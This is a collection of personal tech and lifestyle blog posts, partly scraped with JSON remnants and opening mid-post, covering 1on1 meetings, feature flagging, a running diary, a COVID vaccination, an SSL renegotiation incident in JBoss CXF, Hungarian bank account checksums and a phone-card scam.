completely curated, specific to the current situation, concrete, so it is much easier to avoid the trap of generalisation.Development path, inspirationAs a leader, we have a responsibility to help our team member grow personally and professionally, but the other party has to do at least as much to travel on this way. We must create the opportunity, but our team member must take it. If both parties come into the meeting with this in mind, we can develop a 1on1 structure that builds respect, trust, by which we can give each other fair feedback, can grow, and the team will be better as well.As an organisationA more cohesive team, and a trusting relationship with the leader, in addition to higher performance, has been shown to result in lower turnover and team members feel more valued. Research also tells that the two most accurate indicators of engagement are the extent to which a colleague is given opportunities for self-development while doing the job and the healthy relationship with the manager. So it is worth focusing on development and improvement, and the first step is to gather information about your colleagues, for example through your 1on1 discussions.How to have an efficient 1on1?As with all advice on building organisations, these are not unchangeable axioms set in stone, but rather suggestions that we believe working from previous experience. Worth going through not only from a managerial but also from an employee (IC) perspective.      Both parties should be prepared with topics beyond the current ongoing tasks. It’s worth finding a general structure that doesn’t necessarily need to be defined in writing, but that you both know what to expect (some examples: personal chit-chat, work experiences in last period, mutual feedback, discussion of specific situations, career path, next steps, additional tasks that are more challenging compared to current maturity/knowledge level, etc.)        Once the structure is in place, both parties should be engaged, focused, no emails in between, in fact I suggest going without a computer if possible (in the online world, in current virus situation, this is largely impractical if not unsolvable entirely, of course), if notes are to be taken, do it on paper. During the notes post-processing afterwards, we can revisit what was said – if we have the 1on1 right, we’ll definitely have topics to think about.        The phrase “manage your manager” is extremely popular these days, and it’s probably the most important piece of advice I could give to a team member or even a fresh colleague. No one knows what you need better than you, how you want to develop and in what direction. It takes a dose of personal and professional self-awareness, and a good leader can help you along the way with assessment and guidance questions, but help him or her once you’ve figured out what your path is. Even without explicit questions, if you share your insights on 1on1 meetings, sooner or later it will be getting clearer and clearer: “How could things be fixed, repaired, improved? How can I contribute to this? I really enjoyed this and this, that and those less, how can I get more of the former ones? In what position could I be more likely to encounter these kind of tasks?” Feel free to ask your manager about his/her insights, as he/she presumably has a broader view of the field. (Important: I’m not talking about deep technology here, you might know twice as much as he/she does.)        Don’t talk too much as a manager on 1on1. Ask questions, try to clarify things, and when you think you understand, ask another question. I’m not a fan of rules of thumb, but if I had to say one anyway, I’d say that your subordinate should talk about twice as much as you, the 1:2 ratio is pretty close to healthy in general.        You don’t have to feel like you’ve changed the world at the end of every 1on1, but if nothing worth mentioning happens for months, it’s worth rethinking things based on the points above. If you feel particularly great afterwards, or if you feel weird (understand well), then that means something happened there, something is changing, in a good way you are improving. Look at these feelings and draw the right conclusions, you can talk about them in the next 1on1 as well.  SummaryThe subject is not easy, I can count on one hand the hundreds of my colleagues, past and present, who have done this really well. However, it’s worth dealing with it, because our mood, our performance, our work methods, and, through it, our future, are all affected by this kind of meeting in the workplace. We did not cover the COVID-19 situation specifically, but it can be even more important to take care of each other with proper attention as well.At Danubius, we are not experts in 1on1s, but trying to continuously improve in this area, because we value our colleagues and the atmosphere of trust. The positive impact of this process is very clear: we can efficiently perform quality end-to-end software development in multiple domains.I wrote this article for Danubius Tech Blog originally."

      "content"  : "I wrote this article for Danubius Tech Blog originally.Have you ever been working in a situation as a project manager, business owner, product owner on a project or in an organisation, when a major change you have been waited for so long was deployed to production related to an application you were responsible for, and what worked perfectly yesterday’s now broken, but you couldn’t intervene? Are you familiar with the terms rollback, while you shouldn’t have to? Perhaps you have developed new functions with IT guys, but when you went live, you couldn’t make sure everything was functioning properly, before opening it to the full audience of customers?Have you ever done market segmentation as a marketing expert, but it never occurred to you that the app could be used to target specific users, and display differently to some groups than to others? Did you want to try something new, but weren’t sure if it would have the same effect that you expected? Has IT supported A/B testing so far?As a developer or operator, have you ever not slept the night after a release, because it was impossible to turn off non-operable features, systems were slow to revert to previous state, or there were interdependencies between pieces of code that only a full revert helped and lost all new features? Have you missed proper testing ever? Has it taken days to do a sweaty merge after months of development on several different branches even after following some well-written strategy like Gitflow?Feature flagging is not the Holy Grail, but it can be very helpful for all involved stakeholders in the software development life cycle.What is feature flagging?There are many definitions out there, but probably the most precise one if we say that feature flagging is an opportunity to change the application’s behaviour and feature sets after the code has been deployed to the running environment, e.g. production one. This leads to many other great chances during and after the standard development process.Main benefits of feature flaggingThere are basically 3 (maybe 4) important categories, where this mindset and strategy can bring in great values.Release managementProbably the most used use-case. With feature flag approach changes can focus on smaller segments of customers – why would you roll-out the product to the entire audience after weeks or months of tests, while you can push features to production and receive feedback from only a chunk of people and then iteratively increase the userbase? They can be even more targeted, such as enabling risky functions only for the patient ones at first. If something is not working, one click, and the new features become unavailable. It is easy to manage and no need for any IT involvement to do that. (Further goods here: setting the exact timing and audience of the release, iterative rollout, friends and family, highly decreased release risk, beta/canary release, etc.)Development and Operation after deploymentIt is not enough to have a successful release, systems need to be kept up and running. In the most cases feature flagging is easy to implement from development point of view, operators also like to work with, because even though organisations using feature flagging tend to release more and more frequently over time, this still doesn’t cause more rollbacks from production, quite the contrary: the rollbacks’ number decrease due to the fact, that switching off a feature set does not mean new deploy or code change at all. Even later, if a team responsible for a certain application finds, that some elements of the infrastructure or a component of a software stack is not functioning, which causes performance issues, they have a chance to intervene immediately and switch off high resource–consuming features. (We do not cover topics like software architecture design and high-availability - hereinafter HA - here, obviously feature flagging cannot replace all these steps later, if they were skipped earlier. Further goods here: tweaking on-the-go, direct access from business PoV to operation (need to handle with care), no rollback, etc.)Experimenting with real customersMarketing or Sales can work with feature flags to get more insights about their customers built on top of the data company alerady owns. Let’s imagine they want to show a different advertisement picture to people above and under 30 years, but they do not know how long this promotion or the differentiation will last. With feature flags the problem can be solved easily, and after development and deploy, no IT assistance need to change the features, targets, scopes, etc.“Functionalities”Some features can be available only for a smaller set of customers by design, and feature flag SaaS solutions can be part of the design. It is not recommended, but a real option.Possible threatsSecurityNever ever publish a possibly vulnerable, not properly tested feature to production even with switched off flag, because it is very easy to miss-click, allow it accidentally, and provide an easy-to-break honeypot and optional attack vectors to possible attackers.ConsistencyWhile more and more features go to production with the approach mentioned, later all these can behave as a technical debt, which obviously has a price. Do not forget about it.On the other hand, feature flagging strategy is good to have at start, because later it can be difficult to introduce. Consider defining process, controlling access of features, audit of switching on and off, maintain documentation, guides and set expectations from feature flagging and meisure to have a chance to improve.AvailabilityWhat happens if feature flag service is not available? Answer this questions and introduce local cache, especially if you use SaaS flagging system, but it can be beneficial also, if you have your own flagging application, because this way you do not need to build or buy a HA infrastructure for your internal feature flagging solution. Latency and tolerating failures are also worth thinking about.CostIn general, it is a cheap solution compared to other IT techs, but it depends on how you develop the environment: do you ask internal devs to provide internal feature flagging system, or pay for a SaaS. Whichever it is, usually the cost/income ratio is quite good.Where to startWe will use ConfigCat in the example, but any other SaaS provider will work very similar way. First of all, register on the webpage and set our first feature.To connect the API to our local code, follow the steps described on the FAQ. As we use Python right now, install configcat-client.pip install configcat-clientUse your favourite IDE, and try it out.If this works, the good old if-else statements do the rest of the magic, and marketing specialist, business owners can switch features on and off from now on by a single click.Example opportunitiesIterative rollout, A/B testingStart with like 5% of the customers, and if everything seems fine, increase again and again.Geolocation based appearanceFeature 4 is so great, and only Germany can reach.Some providers on the market (SaaS too)  ConfigCat (we use this one)  Featureflags.io (Opensource)  LaunchDarkly  Vwo  Cloudbees  Hackle  Split.ioSummaryFeature flagging is a key element of giant tech companies and using it may help your business and team grow, transform to a fast-paced environment, where release, testing and experimenting are not fearful words, but something you are familiar with from the daily routine.In Danubius, we used the approach in different domains (education, banking, and many local product development), and in different countries (Belgium, The Netherlands, Hungary, UK, etc.), feature flagging was a great help for every projects and every customers.If you need help in feature flagging or in general software development, please, feel free to contact us.I wrote this article for Danubius Tech Blog originally."

      "content"  : "My personal, short sports historyThe sport was always a central part of my life, I used to do athletics and play soccer in high school. At university, sports became less important, less focused, so I usually ran, or rode the bike at most twice a week, or so, but not even close to a planned regularity. When I turned ~28, running found me again, trained 5 times a week at an amateur level, and participated in a lot of races.Some medals acquired between 2017 and 2019My best official half marathon time was 1:37:45.Covid situationAfter I lost a lot of weight in December 2019 due to hospital reasons (not covid), my primary focus was to build some muscles (and fat) back. After half a year, I was back at my normal weight, but unfortunately I couldn’t stop there. Covid didn’t push me to move more, to put it mildly, and while eating and staying at home continued, proper opposite pole, exercising couldn’t be part of my daily routine.Weight changes in last 12 months (X: months, Y: kg)I am not satisfied, not only with my increased paunch but my cardio and general physical strength either.What are my goals?Very simple: improve fitness, make sports daily routine again, and participate in the WizzAir Budapest running race on 29th August 2021 (10k or 21k distance, doesn’t really matter, frequent exercising is the only mandatory expectation).Plan to deliverFirst and foremost: change starts right now. I pulled my Polar v800 watch from the bottom of the drawer, charged it, changed the battery in the H10 HR sensor, and put the training plan together with Polar Flow. Optionally I may complete exercises with Freeletics workouts, which I really like, and have experience in it with more than 1100 training in my muscles.First month of HR based training planWish me luck and fortitude! Follow and join me on Strava, if you want, and achieve results together!Progress so farLater I plan to summarize my weekly progress below.Week #1Trainings were easy and introductory. My HR rised so fast, therefore during low-HR jogging I had to walk a lot. My body needs to get used to sports again, but I’m glad first week’s over, waiting for next steps curiously.Week #2Getting better, but received second Pfizer-vaccine, which knocked me out, so I had to skip Sunday training. I am almost pretty sure, that Monday will be skipped, too, due to the very same reason. :(Week #3Monday was skipped as mentioned. We were on holiday at the whole week, travelled to the lake Balaton, but trained almost every single day, and on Saturday I had the opportunity to go for a fantastic bike ride. My weight did not change so far, so I have to focus on my candy consumption as well. :)Week #4An eventful week with extra biking and hiking activitied compared to the plan. I enjoyed it!Week #5Average week with the enjoyment of Saturday chill with a training-free day. Planned to go to hike, but rain stopped and made us to watch European Football Championship. :)Week #6I keep going, nothing special!Week #7Crazy hot weather, I started to switch outdoor running to treadmill. So far so good!Week #8I had no energy to finish the week properly, because of a travel to the countryside. Tried sup, so we didn’t skip moving time entirely (w/ Nóri), but no running took place. (Sup was not tracked, however I deeply encourage you to try this sport / leisure time activity, because it’s so much fun!)Week #9First part was absolutely normal, but at the weekend we travelled to the Lake Tisza and instead of proper planned training, we were canoing and riding bike around the lake day by day, which were not tracked with Polar device. Kcals were burned! :)Week #10Air conditioners did not like me very much, after one strength training on Monday I started to feel bad and by Thursday an evolved quinsy with 39 Celsius fever appeared, therefore antibiotic cure started on Friday.Week #11-12Two weeks holiday, first part was still about recovering from previously mentioned illness, but the second week was pure relax with some SUP, walk and badminton activities. All were Polar-untracked. Next week I had to get back on the “planned” track.Week #13Running, biking, commuting, fun! Only Apple Watch was with me, so no usual Polar tracking is available, but Strava.Week #14High school reunion at the weekend, otherwise pretty normal week.Week #15Some not regular bike rides only, mostly holiday with friends. Next week will be better, because I am going to start to wake up earlier and move in the morning.Week #16Training in the mornings, very good to start the day this way.SummaryIt was a good experience, I am happy about sport being back in my life, even though I couldn’t attend Wizz Air race due to other weekend activities, mostly travelling, I consider this mission accomplished. Hope you were able to start a new, or continue a previously introduced habit with me, keep going on that way. The documentation of this track for myself stops here. Thank you for being part of it."

      "content"  : "Several independent sources declare, and if we are honest, no reason to contradict, that the last 2 decades were one of the happiest, most peaceful period in human history. Hardly had any wars compared to previous centuries globally, many diseases could be cured or prevented, had food and water to consume, even in the poorest countries things got better. I can recommend a swedish doctor, Hans Rosling, UN health-specialist’s research and fact quizzes in this topic. He highlights, that things got better during past couple decades even in developing countries, not only in the “west”, and related to this, even most intellectual people have a confused, more than 30 years old picture of the world – quite shocking to realize.So we started 2019 in this social situation without any “training” before, when a little virus could turn our whole,  previously known world upside down, and made us prove, that humans are still able to adapt to environmental circumstances. Right now it seems, that science was able to provide solution, but to make it complete, every single person needs to contribute.Preliminary stepsIn Hungary a governmental, very quickly fillable form is the only official option to register for vaccine. These collected data are transferred to your GP (your “personal”, local doctor), who hopefully knows everything about your medical history, and also able to decide, which vaccine is good for you. At this point, you have no chance to cherrypick between vaccine types.It was the end of January, when I applied for, and almost 3 months later, yesterday received the first dose. I think it is quite good considering, that I am 33 with no serious diseases, and I declined the first vaccine from another company 3-4 weeks ago. Why did I do this?Quick health historyThe answer is pretty straightforward: a little more than 1 year ago, I had got hospitalized for more than 3 weeks with a simple Campylobacter bacterial infection’s side effect: Guillain-Barre syndrome, which is an autoimmunish disease with (in most cases temporary) paralysis. I have the most wonderful GP of all, who really cares about patients, and considering circumstances, so I was put into another vaccine’s waiting line. One day I answered the phone, and accepted the proposed vaccine planned for the weekend.ExpectationsI hoped as fast process as possible in the vaccination center, no people in my 2-meter radius. Expected so much waiting in different lines, justifiably frustrated healthcare workers and generally impatient people. What happened really?RealityMy appointment for vaccination was at 11:30, Saturday, but arrived much earlier, because I wouldn’t want to make a whole country wait. Pushed the front door of the hospital, a soldier immediately stopped me: disinfection time! Some fluid onto my hands, some questions about health, yes, everything is okay. Next room was a big hall, separated logically: you need to register at left side, soldiers checked your data with appropriate respect and some humour to encourage lightly frightened people. In the middle of the hall, at another desk, two people in white jackets double-checked my health condition (without measurements or any technical device), and tell me where to wait. After a short period, a nice nurse / doctor asked me to go behind the blue curtain with her, and while her colleague checked my address, where vaccination cards can be sent to, I got the vaccine in my chosen arm (left). I double-checked, which vaccine it was. After leaving the separated premise in the middle, I was asked to wait for my first certificate at the right, where three girls edited these papers with all data, most importantly with the date and time of my next dose of vaccine. After like 15 minutes, a soldier shouted my name gently (I know gently shouting may sound weird, but it happened), and handed my papers over with reading some lines (for checking purpose) loudly, such as my name, mother’s name, birthdate and next vaccination time.SummaryThe whole process is well-organized, every people knows his or her job, health workers are extremely nice despite the tremendous work, and even soldiers can be funny in a good way, while keeping order. I appreciated all the help and hard work these people have beeing doing for the whole country for more than a year, and now I am even more grateful. For the second vaccination I definitely plan to carry some goods (chocolate, bonbon, etc.) for thanking them – it’s not much, but can be a gesture of being valued. They all deserve the highest appreciation and respect."

Press the little play button on the upper left corner. It is best in Google Chrome, have fun!IT Business Analysis – be a bridge between business and devsI’ve been Head of IT BA team for two months or so, and this transition period is very interesting and exciting in my life. In the last couple years I worked as a frontend engineer with strong technical focus, then some years as head of that team, but this is one is quite different: we need to understand business demands, have to translate into IT “language”, e.g. into a system or application design, which can developers can work from, and most importantly: deliver stuff in the end. I am not ashamed to learn from others, so beside case studies and own experiments, I also get information from traditional courses and instructors. This is why I tried to pick a training especially from someone, who is not near to our own organization, never saw our working process, and can teach me out-of-the box BA concepts. NorwalkAberdeen seemed to match these requirements with Fundamentals of Business Analysts.Understanding the business benefitsEven though the course is very short (couple hours of video with some homework and note taking exercises to understand and point out important things in a mass), it covers the most relevant elements of BA interviewing, requirement analysis, stakeholder and lifecycle management, agile, waterfall, SDLC, transforming needs, UML stuff (E-R, data flow, use-case, bpm), etc. with a deepdive opportunities, links for every topics.

These are weekly, sometimes bi-weekly allocated, very interesting tasks, which you are able to understand the topic and get hands-on experience with.Cryptography is an indispensable tool for protecting information in computer systems. In this course you will learn the inner workings of cryptographic systems and how to correctly use them in real-world applications. The course begins with a detailed discussion of how two parties who have a shared secret key can communicate securely when a powerful adversary eavesdrops and tampers with traffic. We will examine many deployed protocols and analyze mistakes in existing systems. The second half of the course discusses public-key techniques that let two parties generate a shared secret key. Throughout the course participants will be exposed to many exciting open problems in the field and work on fun (optional) programming projects. In a second course (Crypto II) we will cover more advanced cryptographic tasks such as zero-knowledge, privacy mechanisms, and other forms of encryption. /Course summary on Coursera/I expected an average quality from a free online course, something like 4 of 10, and also believed, that Stanford is a 10 of 10 in being great (engineering) school. I was curious, how these two seemingly opposite prejudices met, and the answer is here: extremely wonderfully. I had to fight with every assignments, not much, but enough, enjoyed all of them, never were boring. I won’t lie to you: there were slides, which I had to check twice, while I was learning. Okay, maybe four times, sometimes six. My point is, it’s not a course, which you run through, and may also require to have some preliminary study in mathematics (nothing more than a solid high school knowledge) and analytic skills.State of AccomplismhentI can encourage you to take this class with good hearth, if you already accepted that writing a crypto library is not a senior developer-only thingie, but more like a complex mathematician task, and you want to understand deeply, why."

      "content"  : "Last year’s ending was quite exciting at work, because in the mid of December one of government’s organizations (I do not name it for purpose) changed an SSL certification – we did the same with the pair of it, of course -, but the connection was still not working. No other modification was communicated, so we tried to figure out what happened at our side.  The penalty of late data provision would have been ~1.700 USD / customer, and 10.000+ of them were affected, so you can imagine how hard we tried to solve the situation.I want you to be in context: there was serious chance getting a penalty for this incident, because of a deadline which we must provide information before. Because of the communication error we couldn’t send these files and the penalty could be 8-9 digits in HUF. (No other official workaround exists.)Firstly, we imported ssl certs to local Windows keystore and tried to call remote webservice with a tunnel, which was working, so we realised, that ssl certs are fine and besides them there must be other changes in the system. We could not communicate with the government organization, not getting email answers and did not have direct contact either unfortunately. (Later, when things got really hot, we tried to call their IVR system and pushed buttons randomly, but in the end, nobody was competent in this problem enough.)We thought about keystore problem, because we do not use the official and recommended JBoss keystore for this cert, but an own one for many reasons I do not explain here. We made some test, nothing suspicious, so moved on.Photo by Silas Köhler on UnsplashIn JBoss server.log UntrustedURLConnectionIOException appeared (I won’t copy the whole stacktrace). After googling a bit we have found this Apache Jira ticket, which explained us what the problem may be. After checking remote webserver it turned out it is an IIS. We use a JBoss Application Server 6.1 with CXF right now, so the environmental details and JBoss stacktrace were the same as it is described here. I copy the explanation from Jira:Problem is that client certificate verification is done by IIS in later time, not at the beginning of the SSL communication. I’ll try do describe the communication:1. SSL Handshake is done between client and IIS server, but first WITHOUT client certificate verification.2. Client sends the HTTP request (at least the header, where URL is specified).3. IIS server recognizes the requested URL and re-initiates the SSL handshake (with SSL message Change_cipher_spec). It works in this way because in IIS you can specify different SSL behaviour for different URLs. So for example, for one endpoint you can configure SSL without client certificate and for second endpoint WITH client certificate.4. During the second SSL handshake, the client certificate is requested by IIS server and verified.5. Then the rest of request is processed by IIS server.We took a deep breath, okay, guys, this is a known error, let’s solve it. What is the workaround? None. Maybe a CXF update, maybe not, but Christmas was close, so there were not any chance for doing this with tons of INT, UAT testing, etc. At this point we had external developers on site as well to help and build literally dozens of variations of SSL parametrization in the business application. Remember once more, we were not told that besides ssl cert change, there were other modifications! This is why we focused on our side and tried to do everything we could.Also checked the RFC of:7.4.4. Certificate RequestWhen this message will be sent:A non-anonymous server can optionally request a certificate from the client, if appropriate for the selected cipher suite. This message, if sent, will immediately follow the ServerKeyExchange message (if it is sent; otherwise, this message follows the server’s Certificate message).It was strange, nothing helped. This was the point where we asked our official JBoss support about core CXF implementation. After giving all information we had they agreed we checked everything we could so they rebuilt cxf-rt-ws-security*.jar with security modification you see explained in Jira ticket linked above, and after second try it just worked. Penalty is off the table. Huh.Many days later governmental organization replied, and after some e-ping-pong they admitted they changed IIS SSL settings. After reverting that, the official JBoss CXF implementation worked as well.End of story. Unfortunately, I am not allowed to publish our temporary code manipulation and solution of CXF security classes here, but I am pretty sure, Jakub will create an official workaround here."

Review will be posted later.Photo by EngadgetFor this great watch, Polar announced a major upgrade, which will contain smart watch notifications. Great news! Sooner I was thinking about Apple Watch as well, but had to drop that idea, because it will not be able to use gps without phone (no built-in chip), and I usually don’t carry mobile in my pocket or armband. Now I am really glad about the decision I’ve made. By the way, I simply cannot understand, how Apple can call his watch a sportwatch, if it does not contain gps sensor inside.Photo by EngadgetThe new features of Polar will come in 3 months, so knowing Polar’s communication, it will come by May. Later, M400 watch will get the new functions, too. I can hardly wait."

Short answer is no, or very unlikely. But why?GIRO account numbers formatStart from a quick and not so accurate definition: card numbers are what are printed on debit or credit cards, while account numbers identify banking accounts. These two connect in banking systems, when card gets assigned to particular account. This can be changed very easily, but traditional banks are not offering such online services usually. Giro account numbers contain 2x8 or 3x8 numbers, and the 8-digits blocks are separated by hyphen (-). In Hungary most banks introduced the 24-digit format, but the biggest competitor (OTP) is a commited 16-digit user. Frankly, it doesn’t really matter, filling last 8 digits with zeros can transform type-16 to type-24.So the format is the following: AAABBBBC – DDDDDDDE – FFFFFFFG.What can we know from each digits?Let’s check one by one, what numbers mean or how are generated.AAA: Giro-code from 3 digits, in Hungary, MNB (Central Bank of Hungary) provides it and assigns to banks. (e.g. CIB – 107, OTP – 117, etc.) The actual list can be downloaded from MNB homepage.BBBB: Branch identifier of the bank.C: A checksum generated from AAABBBB, the exact algorythm will be described later.The specification says that remaining 16 digits can be used for customer identification, but most banks do this with 9-16 digits, and last 8 numbers are used for sub-accounts, ot not used at all, as we saw previously. A common best-practice is:DDDDDDD – Customer internal, bank-specific ID.E – Generated checksum from DDDDDDD.FFFFFFF – Sub-account ID.G – Generated checksum from FFFFFFF.Error detectionBased on the previously mentioned 3 generated checksums, transfer services or basically anybody can check, if the account numbers you are trying to transfer money to, is valid or not logically. Obviously it doesn’t validate it’s real existence, but can avoid unwanted transactions.Photo by Anna GruThe error detection algorythm is the following:Multiply first 8 digits’…  first number by 9  second number by 7  third number by 3  fourth number by 1  fifth number by 9  sixth number by 7  seventh number by 3  eighth number by 1,and add these products. The summarized amount must be divisible by ten without remainder. If it’s not, the giro account number cannot be valid.As a consequence, most likely there won’t be mistaken transfers, as long as you don’t have multiple errors in the same account numbers. So no reason to worry, but always handle your finances with proper care."

      "content"  : "“Social engineering techniques have been popular almost since Graham invented the telephone” - i wrote, when i started to summarize my thoughts in this topic, but then I realized, that much earlier Devil fooled Eve by convincing him to eat an apple in Genesis, and even Steve Jobs his majesty couldn’t avoid this flick.Nowadays fraudsters do not want us to eat apple, but to jeopardize our money. In Hungary, the newest scam is about the following: you receive a phone call from unknown number about possible winning of 6 million HUF (roughly 20.000 EUR), if you read out a freshly bought prepaid phone card’s number over the phone. That mentioned plastic item costs maybe like 3.000 or 5.000 HUF, and even if I got cheated – thinks the victim – it’s not much compared to the opportunity to change my life (“bigger good” as John Stuart Mill would say) and push millions into my pocket.  It’s an obvious fraud from an external point of view, and you immediately recognize it, but when you are in, maybe it’s not that trivial.I believe, that options to earning money legally and planned, if you have none at the moment, is quite limited: you work hard, or you have an idea, and after you work hard. People tend to forget about St. Benedict’s regula’s most important teaching: ora et labora. We as humans usually do not pray and work, but pray (optionally), and hope to get lucky."
